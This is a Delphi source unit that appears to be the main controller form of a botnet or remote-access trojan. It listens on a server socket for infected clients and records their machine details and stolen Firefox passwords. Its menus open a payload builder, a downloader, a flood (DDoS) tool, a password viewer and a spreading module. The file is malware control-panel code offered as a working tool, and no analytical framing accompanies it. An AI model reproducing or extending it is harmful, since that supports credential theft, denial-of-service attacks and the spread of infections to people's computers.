unit uGeneral;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, XPMan, ImgList, ScktComp, PngImageList;

type
  TFrmGeneral = class(TForm)
    MainMenu: TMainMenu;
    StatusBar: TStatusBar;
    Connect1: TMenuItem;
    ListUsers: TListView;
    btnServer: TMenuItem;
    XPManifest1: TXPManifest;
    SinFlags: TImageList;
    PopupMenu: TPopupMenu;
    Server: TServerSocket;
    btnListen: TMenuItem;
    btnStopList: TMenuItem;
    ImgMenu: TPngImageList;
    Flood1: TMenuItem;
    Flood2: TMenuItem;
    Passwords1: TMenuItem;
    Spread1: TMenuItem;
    procedure btnStopListClick(Sender: TObject);
    procedure btnListenClick(Sender: TObject);
    procedure ServerClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ServerClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure btnServerClick(Sender: TObject);
    procedure Flood1Click(Sender: TObject);
    procedure Flood2Click(Sender: TObject);
    procedure Passwords1Click(Sender: TObject);
    procedure Spread1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FrmGeneral :TFrmGeneral;

implementation

uses uFlag, uListen, uManageUsers, uString, uBuild, uDownloader, uFlood,
  uPasswords, uSpread;

{$R *.dfm}

procedure TFrmGeneral.btnStopListClick(Sender: TObject);
begin
  Server.Active := False;
  ListUsers.Clear;
  StatusBar.Panels.Items[0].Text := 'Status: On standby';
  StatusBar.Panels[1].Text := 'Connection(s) : ' + IntToStr(FrmGeneral.ListUsers.Items.Count);
end;

procedure TFrmGeneral.btnListenClick(Sender: TObject);
begin
  FrmListen.Show;
end;

procedure TFrmGeneral.ServerClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  Command     :String;
  Parameters  :array[0..1024] of String;
begin
  Command := Socket.ReceiveText;
  FillChar(Parameters,SizeOf(Command),#0);
  SplitString(PChar(Command), Parameters);

  if Parameters[0] = 'GetPcInfo' then
    AddUser(Parameters[1], Socket.RemoteAddress, Parameters[2], Parameters[3], Parameters[4], Parameters[5]);

  if Parameters[0] = 'PassFirefox' then AddPass(Parameters);

end;

procedure TFrmGeneral.ServerClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  CleanUpUsers(Socket);
end;

procedure TFrmGeneral.ServerClientError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
var
  Rapport : String;
begin
  case ErrorEvent of
    eeGeneral : Rapport := 'Error unexpected: '+Socket.RemoteAddress;
    eeSend : Rapport := 'Clerical error on connection socket: '+Socket.RemoteAddress;
    eeReceive : Rapport := 'Misreading on connection socket: '+Socket.RemoteAddress;
    eeConnect : Rapport := 'A request for already accepted connection could not be completed: '+Socket.RemoteAddress;
    eeDisconnect : Rapport := 'Error of closing of a connection: '+Socket.RemoteAddress;
    eeAccept : Rapport := 'Error of acceptance of a request for connection customer: '+Socket.RemoteAddress;
  end;
  CleanUpUsers(Socket);
  ErrorCode := 0;
  ErrorEvent := Null;
end;

procedure TFrmGeneral.btnServerClick(Sender: TObject);
begin
  FrmBuild.Show;
end;

procedure TFrmGeneral.Flood1Click(Sender: TObject);
begin
  FrmDownloader.Show;
end;

procedure TFrmGeneral.Flood2Click(Sender: TObject);
begin
  FrmFlood.Show;
end;

procedure TFrmGeneral.Passwords1Click(Sender: TObject);
begin
  FrmPasswords.Show;
end;

procedure TFrmGeneral.Spread1Click(Sender: TObject);
begin
  FrmSpread.Show;
end;

end.
